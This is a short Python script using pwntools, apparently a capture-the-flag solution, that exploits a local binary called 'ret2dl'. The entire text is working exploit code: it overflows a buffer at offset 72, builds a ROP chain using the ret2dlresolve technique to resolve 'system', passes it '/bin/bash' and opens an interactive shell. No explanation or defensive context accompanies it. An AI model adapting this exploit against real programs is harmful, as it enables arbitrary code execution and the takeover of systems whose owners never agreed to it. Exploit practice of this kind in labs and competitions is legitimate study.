from pwn import *

context.arch = 'amd64'
elf = ELF('./ret2dl')
rop = ROP(elf)

r = process('./ret2dl')

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/bash'])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

r.send(fit({72: rop.chain(), 200: dlresolve.payload}))
r.interactive()
